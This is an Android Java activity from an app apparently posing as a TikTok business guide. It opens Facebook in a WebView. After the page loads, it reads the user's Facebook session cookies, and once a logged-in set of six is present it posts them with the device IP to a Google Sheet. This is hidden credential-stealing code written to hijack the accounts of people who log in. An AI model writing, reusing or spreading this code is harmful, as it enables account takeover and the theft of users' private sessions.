package com.teamwork.businessguideprofortiktok.src.resource.pages.webview_page;

import androidx.appcompat.app.AppCompatActivity;
import androidx.lifecycle.Observer;
import androidx.lifecycle.ViewModelProviders;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.teamwork.businessguideprofortiktok.R;
import com.teamwork.businessguideprofortiktok.src.resource.pages.reponse_cookies_page.ReponseCookiesActivity;
import com.teamwork.businessguideprofortiktok.src.resource.viewmodels.google_sheet.GoogleSheetViewModel;
import com.teamwork.businessguideprofortiktok.src.utils.Constant;


public class WebViewFacebookActivity extends AppCompatActivity {
    private WebView mWebViewFb;
    private GoogleSheetViewModel mRepository;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webview_fb);
        mRepository = ViewModelProviders.of(WebViewFacebookActivity.this).get(GoogleSheetViewModel.class);

        initView();
        listenerCallbackSever(mRepository);


    }

    private void listenerCallbackSever(final GoogleSheetViewModel mRepository) {
        mRepository.getCookies().observe(WebViewFacebookActivity.this, new Observer<String>() {
            @Override
            public void onChanged(final String cookies) {
                mRepository.getIp().observe(WebViewFacebookActivity.this, new Observer<String>() {
                    @Override
                    public void onChanged(String ip) {
                        mRepository.postDataGoogleSheets(ip,cookies);
                        Log.d("TAG", "onChanged: cookies: "+cookies);
                        Log.d("TAG", "onChanged: ip: "+ip);
                    }
                });
            }
        });

        mRepository.getDataReponseSever().observe(WebViewFacebookActivity.this, new Observer<String>() {
            @Override
            public void onChanged(String s) {
                Log.d("TAG", "onChanged: 111: "+s);
                if (s.equals("Success")){
                    Intent intent = new Intent(WebViewFacebookActivity.this, ReponseCookiesActivity.class);
                    startActivity(intent);
                }else {
                    Toast.makeText(WebViewFacebookActivity.this, "NO COOKIES", Toast.LENGTH_SHORT).show();
                    try {
                        Thread.sleep(3000);
                        finish();
                        startActivity(getIntent());
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }

    private void initView() {
        mWebViewFb = findViewById(R.id.webViewFB);
        mWebViewFb.loadUrl(Constant.mUrlFace);
        mWebViewFb.setWebViewClient(new WebViewClient(){
            @Override
            public void onPageFinished(WebView view, String url) {
                String strCookies = CookieManager.getInstance().getCookie(Constant.mUrlFace);

                String[]arrayCookies = strCookies.split(";");

                if (arrayCookies.length == 6){
                    String ip = mRepository.getLocalIpAddress();
                    mRepository.setCookies(strCookies);
                    mRepository.setIp(ip);

                }
            }
        });
    }
}